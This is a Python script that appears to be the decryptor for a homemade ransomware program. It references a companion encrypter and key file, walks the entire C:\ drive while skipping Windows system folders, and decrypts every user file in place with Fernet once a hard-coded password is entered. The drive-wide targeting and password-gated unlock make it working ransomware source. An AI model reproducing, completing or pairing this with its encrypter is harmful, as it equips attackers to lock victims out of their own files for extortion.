import os
from cryptography.fernet import Fernet

root_dir = "C:\\"


def decrypt_all_files(root_dir):
    all_files = []
    excluded_dir = [
        "System32", "Windows", "Program Files", "AppData", "ProgramData",
        "$Recycle.Bin", "System Volume Information", "Boot", "Fonts", "Logs",
        "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
        "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS",
        "Common Files", "Default User", "Default", "Public", "Program Files (x86)"
        ]
    for dirpath, dirnames, filenames in os.walk(root_dir):
        #Exclude some directories
        dirnames[:] = [d for d in dirnames if os.path.join(dirpath, d).split(os.sep)[-1]not in excluded_dir]

        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if full_path.endswith(("decrypter.py", "encrypter.py", ".git", "TheKey.key")):
                continue
            all_files.append(full_path)
    return all_files

files = decrypt_all_files(root_dir)

#We need the previous key to decrypt the files. 
with open("TheKey.key", "rb") as key:
    secretKey = key.read()

secretWord = "marimba"
userInput = input("Enter the password to unlock the content:\n")

if secretWord == userInput:
    fernet = Fernet(secretKey)
    for file in files:
        try:
            with open(file, 'rb') as theFile:
                contentOfFiles = theFile.read()
            #Decrypt data
            decryptedContent = fernet.decrypt(contentOfFiles)

            with open(file, "wb") as theFile:
                theFile.write(decryptedContent)
            print(f"Decrypted {file}")
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    print("Your files have been decrypted")

else:
    print("wrong password")
    
